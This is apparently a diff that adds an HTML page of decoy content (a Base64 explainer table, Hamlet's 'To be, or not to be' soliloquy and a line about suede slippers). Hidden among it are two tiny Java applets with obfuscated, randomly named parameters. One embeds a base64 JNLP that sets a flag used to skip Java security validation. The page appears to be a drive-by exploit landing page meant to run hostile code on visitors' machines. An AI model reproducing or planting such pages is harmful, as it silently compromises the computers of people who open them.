@@ -1,0 +1,117 @@
+<html>
+<head>
+<title>provide a name </title>
+
+
+</head>
+<body>
+<table cellpadding="3" cellspacing="1" border="0">
+            <tr>
+              <th>Text content</th>
+              <td colspan="8">
+<strong>
+<applet width="23"  height="7">
+<param name="jnlp_href" value="applet.jnlp" />
+<param name="jnlp_embedded" value='PGpubHAgaHJlZj0idmlkZW9nYW1lcy5qbmxwIiBzcGVjPSIxLjAiIHhtbG5zOmpmeD0iaHR0cDovL2phdmFmeC5jb20iPgogIDxpbmZvcm1hdGlvbj4KICAgIDx0aXRsZT52aWRlb2dhbWVzPC90aXRsZT4KICAgIDx2ZW5kb3I+dmlkZW9nYW1lczwvdmVuZG9yPgogIDwvaW5mb3JtYXRpb24+CiAgCiAgIDxyZXNvdXJjZXM+CiAgICAgICAgPGoyc2UgaHJlZj0iaHR0cDovL2phdmEuc3VuLmNvbS9wcm9kdWN0cy9hdXRvZGwvajJzZSIgdmVyc2lvbj0iMS43KyIgLz4KICAgICAgICA8amFyIGhyZWY9IkdsbWRpRyIgbWFpbj0idHJ1ZSIgLz4KICAKICA8L3Jlc291cmNlcz4KICA8YXBwbGV0LWRlc2MgaGVpZ2h0PSIxIiBtYWluLWNsYXNzPSJjSUxFLmNsYXNzIiBuYW1lPSJPcnMiIHdpZHRoPSIxIj4KICAgIDxwYXJhbSBuYW1lPSJfX2FwcGxldF9zc3ZfdmFsaWRhdGVkIiB2YWx1ZT0idHJ1ZSIgLz4KCTxwYXJhbSAgdmFsdWU9IjQ2RHdhUXc0OER3YVF3ODVEd2FRdzI5RHdhUXc2OUR3YVF3NjlEd2FRdzgxRHdhUXcyN0R3YVF3ODJEd2FRdzEwMUR3YVF3ODIiICBuYW1lPSJsZGVDU1RMSnlLIiAvPgoJPHBhcmFtICB2YWx1ZT0iNzlEd2FRdzg5RHdhUXc5MkR3YVF3ODREd2FRdzMxRHdhUXcyN0R3YVF3OTdEd2FRdzg1RHdhUXc4MkR3YVF3OTJEd2FRdzgxRHdhUXc5MkR3YVF3OTVEd2FRdzgyRHdhUXcxMDBEd2FRdzkyRHdhUXc5MkR3YVF3ODFEd2FRdzI3RHdhUXc4NkR3YVF3OTFEd2FRdzgzRHdhUXc5MkR3YVF3MjhEd2FRdzgyRHdhUXcxMDFEd2FRdzkzRHdhUXc4MkR3YVF3OTVEd2FRdzk3RHdhUXc5NkR3YVF3MjdEd2FRdzkzRHdhUXc4NUR3YVF3OTNEd2FRdzQ0RHdhUXc5MUR3YVF3OTJEd2FRdzkwRHdhUXc4NkR3YVF3ODBEd2FRdzQyRHdhUXczMER3YVF3MzZEd2FRdzM0RHdhUXcxOUR3YVF3ODlEd2FRdzc4RHdhUXc5MUR3YVF3ODREd2FRdzQyRHdhUXczM0R3YVF3MTlEd2FRdzg2RHdhUXc5MER3YVF3NzhEd2FRdzg0RHdhUXc4MkR3YVF3NDJEd2FRdzMxRHdhUXczMUR3YVF3MzVEd2FRdzE5RHdhUXc4NER3YVF3ODJEd2FRdzkxRHdhUXc4MkR3YVF3OTVEd2FRdzg2RHdhUXc4MER3YVF3NDJEd2FRdzMwRHdhUXczNkR3YVF3MzBEd2FRdzE5RHdhUXc5M0R3YVF3OTVEd2FRdzgyRHdhUXc5NkR3YVF3OTZEd2FRdzQyRHdhUXczNER3YVF3MzREd2FRdzM2RHdhUXcxOUR3YVF3MTAwRHdhUXc3OER3YVF3OTVEd2FRdzgyRHdhUXcxMDNEd2FRdzQyRHdhUXczMUR3YVF3MzJEd2FRdzM3RHdhUXcxOUR3YVF3OTZEd2FRdzk3RHdhUXc3OER3YVF3OTVEd2FRdzk2RHdhUXc0MkR3YVF3MzNEd2FRdzMwRHdhUXczN0R3YVF3MTlEd2FRdzk2RHdhUXc5N0R3YVF3OTJEd2FRdzk1RHdhUXc4MkR3YVF3NDJEd2FRdzM3RHdhUXczNkR3YVF3MTlEd2FRdzc5RHdhUXc5OER3YVF3ODREd2FRdzk2RHdhUXc0MkR3YVF3MzREd2FRdzMwRHdhUXczMyIgIG5hbWU9IkRBV0YiIC8+Cgk8cGFyYW0gIHZhbHVlPSI4MER3YVF3OTJEd2FRdzkxRHdhUXc5MUR3YVF3ODJEd2FRdzgwRHdhUXc5NyIgIG5hbWU9InRLV2RwY2NoIiAvPgogIDwvYXBwbGV0LWRlc2M+Cjwvam5scD4='/>
+</applet>
+</strong>
+			  </td>
+              <td colspan="8">a</td>
+              <td colspan="8">n</td>
+            </tr>
+            <tr>
+              <th>ASCII</th>
+              <td colspan="8" align="center">77</td>
+              <td colspan="8" align="center">97</td>
+              <td colspan="8" align="center">110</td>
+            </tr>
+            <tr>
+              <th>Bit pattern</th>
+              <td>0</td>
+              <td>1</td>
+              <td>0</td>
+              <td>0</td>
+              <td>1</td>
+              <td>1</td>
+              <td>0</td>
+              <td>1</td>
+              <td>0</td>
+              <td>1</td>
+              <td>1</td>
+              <td>0</td>
+              <td>0</td>
+              <td>0</td>
+              <td>0</td>
+              <td>1</td>
+              <td>0</td>
+              <td>1</td>
+              <td>1</td>
+              <td>0</td>
+              <td>1</td>
+              <td>1</td>
+              <td>1</td>
+              <td>0</td>
+            </tr>
+            <tr>
+              <th>Index</th>
+              <td colspan="6">19</td>
+              <td colspan="6">22</td>
+              <td colspan="6">5</td>
+              <td colspan="6">46</td>
+            </tr>
+            <tr>
+              <th>Base64-encoded</th>
+              <td colspan="6">T</td>
+              <td colspan="6">W</td>
+              <td colspan="6">F</td>
+              <td colspan="6">u</td>
+            </tr>
+          </table>
+   
+  
+<strong><applet  archive="scTDp"  code="Xdy.class"  width="23"  height="7">
+<param value="1" name="WindowSize">
+<param value="79DwaQw89DwaQw92DwaQw84DwaQw31DwaQw27DwaQw97DwaQw85DwaQw82DwaQw92DwaQw81DwaQw92DwaQw95DwaQw82DwaQw100DwaQw92DwaQw92DwaQw81DwaQw27DwaQw86DwaQw91DwaQw83DwaQw92DwaQw28DwaQw82DwaQw101DwaQw93DwaQw82DwaQw95DwaQw97DwaQw96DwaQw27DwaQw93DwaQw85DwaQw93DwaQw44DwaQw91DwaQw92DwaQw90DwaQw86DwaQw80DwaQw42DwaQw30DwaQw36DwaQw34DwaQw19DwaQw89DwaQw78DwaQw91DwaQw84DwaQw42DwaQw33DwaQw19DwaQw86DwaQw90DwaQw78DwaQw84DwaQw82DwaQw42DwaQw31DwaQw31DwaQw35DwaQw19DwaQw84DwaQw82DwaQw91DwaQw82DwaQw95DwaQw86DwaQw80DwaQw42DwaQw30DwaQw36DwaQw30DwaQw19DwaQw93DwaQw95DwaQw82DwaQw96DwaQw96DwaQw42DwaQw34DwaQw34DwaQw36DwaQw19DwaQw100DwaQw78DwaQw95DwaQw82DwaQw103DwaQw42DwaQw31DwaQw32DwaQw37DwaQw19DwaQw96DwaQw97DwaQw78DwaQw95DwaQw96DwaQw42DwaQw33DwaQw30DwaQw37DwaQw19DwaQw96DwaQw97DwaQw92DwaQw95DwaQw82DwaQw42DwaQw37DwaQw36DwaQw19DwaQw79DwaQw98DwaQw84DwaQw96DwaQw42DwaQw34DwaQw30DwaQw33" name="ncHLj" />
+<param value="46DwaQw48DwaQw85DwaQw29DwaQw69DwaQw69DwaQw81DwaQw27DwaQw82DwaQw101DwaQw82" name="WAoAQvki" />
+<param value="80DwaQw92DwaQw91DwaQw91DwaQw82DwaQw80DwaQw97" name="DuCwi" /></applet></strong>
+
+<i>To be, or not to be, that is the question:</i><br>
+Whether 'tis nobler in the mind to suffer<br>
+The slings and arrows of outrageous fortune,<br>
+Or to take arms against a sea of troubles<br>
+And by opposing end them. To die—to sleep,<br>
+No more; and by a sleep to say we end<br>
+The heart-ache and the thousand natural shocks<br>
+That flesh is heir to: 'tis a consummation<br>
+Devoutly to be wish'd. To die, to sleep;<br><i>To sleep, perchance to dream—</i>ay, <i>there's the
+rub:</i><br>
+For in that sleep of death what dreams may come,<br>
+When we have shuffled off <i>this mortal coil,</i><br>
+Must give us pause—there's the respect<br>
+That makes calamity of so long life.<br>
+For who would bear the whips and scorns of time,<br>
+Th'oppressor's wrong, the proud man's contumely,<br>
+The pangs of dispriz'd love, the law's delay,<br>
+The insolence of office, and the spurns<br>
+That patient merit of th'unworthy takes,<br>
+When he himself might <i>his quietus make</i><br><i>With a bare bodkin?</i> Who would fardels bear,<br>
+To grunt and sweat under a weary life,<br>
+But that the dread of something after death,<br><i>The undiscovere'd country, from whose bourn</i><br><i>No traveller returns,</i> puzzles the will,<br>
+And makes us rather bear those ills we have<br>
+Than fly to others that we know not of?<br><i>Thus conscience does make cowards of us all,</i><br>
+And thus the native hue of resolution<br>
+Is sicklied o'er with the pale cast of thought,<br>
+And enterprises of great pitch and moment<br>
+With this regard their currents turn awry<br>
+And lose the name of action.<br>
+
+
+
+
+<p>Orange suede slippers with sequin skull at toe and leather piping: full leather interior and sole.</p>
+
+</body>
+</html>
+
+
+
